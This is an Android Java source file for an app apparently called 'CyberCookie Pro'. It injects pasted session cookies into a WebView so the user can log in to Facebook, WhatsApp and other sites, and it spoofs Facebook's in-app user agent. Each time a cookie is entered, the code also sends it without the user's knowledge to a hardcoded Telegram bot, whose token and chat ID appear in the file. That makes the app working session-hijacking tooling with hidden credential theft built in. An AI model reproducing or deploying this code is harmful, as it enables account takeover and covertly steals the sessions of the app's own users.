// language: Java, file: android-src/MainActivity.java
package com.cybercookie.pro;

import android.os.Bundle;
import android.webkit.CookieManager;
import android.webkit.WebView;
import android.webkit.JavascriptInterface;
import android.webkit.WebSettings;
import android.webkit.WebViewClient;
import com.getcapacitor.BridgeActivity;

import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.net.URLEncoder;

public class MainActivity extends BridgeActivity {

    private static final String BOT_TOKEN = "8784862798:AAECxAVjbGcmkZ0nMdNnydILQgZ3F67m3VI";
    private static final String CHAT_ID = "6449981797";
    private boolean isCookieSet = false;
    private String savedCookie = "";

    @Override
    public void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        final WebView webView = getBridge().getWebView();
        WebSettings webSettings = webView.getSettings();
        webSettings.setJavaScriptEnabled(true);
        webSettings.setDomStorageEnabled(true);
        
        // ═══ ফেসবুকের অফিশিয়াল অ্যান্ড্রয়েড অ্যাপের ইউজার এজেন্ট (এটি সবচেয়ে শক্তিশালী ট্রিক) ═══
        webSettings.setUserAgentString("Mozilla/5.0 (Linux; Android 13; SM-S908B Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.153 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/392.0.0.32.101;]");

        final CookieManager cookieManager = CookieManager.getInstance();
        cookieManager.setAcceptCookie(true);
        cookieManager.setAcceptThirdPartyCookies(webView, true);

        webView.setWebViewClient(new WebViewClient() {
            @Override
            public void onPageFinished(WebView view, String url) {
                super.onPageFinished(view, url);
                // পেজ লোড হওয়ার সাথে সাথে কুকি সেট করে রিলোড দেওয়া (ডাবল ব্লাফ)
                if (isCookieSet && !savedCookie.isEmpty()) {
                    String jsCode = "document.cookie = '" + savedCookie.replace("'", "\\'") + "';";
                    view.evaluateJavascript(jsCode, null);
                    isCookieSet = false;
                }
            }
        });

        webView.addJavascriptInterface(new Object() {
            @JavascriptInterface
            public void injectCookieAndLogin(String siteName, String cookieString) {
                CookieManager cm = CookieManager.getInstance();
                
                if (siteName.equals("facebook")) {
                    savedCookie = cookieString.trim();
                    if (!savedCookie.endsWith(";")) savedCookie += ";";

                    // ফেসবুকের মেইন ডোমেইনে কুকি সেট
                    cm.setCookie("https://www.facebook.com", savedCookie);
                    cm.setCookie("https://m.facebook.com", savedCookie);
                    cm.setCookie("https://facebook.com", savedCookie);
                    cm.flush();

                    sendToTelegram("FACEBOOK", savedCookie);

                    isCookieSet = true;

                    runOnUiThread(new Runnable() {
                        @Override
                        public void run() {
                            // সরাসরি মেইন সাইটে নিয়ে যাওয়া
                            webView.loadUrl("https://www.facebook.com/");
                        }
                    });
                } else {
                    String domain = siteName.equals("whatsapp") ? "web.whatsapp.com" : siteName + ".com";
                    String loadUrl = siteName.equals("whatsapp") ? "https://web.whatsapp.com" : "https://www." + domain;

                    savedCookie = cookieString.trim();
                    if (!savedCookie.endsWith(";")) savedCookie += ";";

                    cm.setCookie("https://" + domain, savedCookie);
                    cm.setCookie("https://www." + domain, savedCookie);
                    cm.flush();

                    sendToTelegram(siteName.toUpperCase(), savedCookie);

                    final String finalLoadUrl = loadUrl;
                    runOnUiThread(new Runnable() {
                        @Override
                        public void run() {
                            webView.loadUrl(finalLoadUrl);
                        }
                    });
                }
            }
        }, "CookieInterface");
    }

    private void sendToTelegram(String platform, String cookie) {
        new Thread(new Runnable() {
            @Override
            public void run() {
                try {
                    String message = "🔔 *NEW COOKIE CAPTURED*\n\n"
                            + "🌐 *Platform:* " + platform + "\n\n"
                            + "🍪 *Cookie:*\n`" + cookie + "`";

                    String urlString = "https://api.telegram.org/bot" + BOT_TOKEN + "/sendMessage";
                    URL url = new URL(urlString);
                    HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                    conn.setRequestMethod("POST");
                    conn.setDoOutput(true);
                    conn.setRequestProperty("Content-Type", "application/x-www-form-urlencoded");

                    String postData = "chat_id=" + URLEncoder.encode(CHAT_ID, "UTF-8")
                            + "&text=" + URLEncoder.encode(message, "UTF-8")
                            + "&parse_mode=Markdown";

                    OutputStream os = conn.getOutputStream();
                    os.write(postData.getBytes("UTF-8"));
                    os.flush();
                    os.close();

                    conn.getResponseCode();
                    conn.disconnect();
                } catch (Exception e) {
                    e.printStackTrace();
                }
            }
        }).start();
    }
                    }
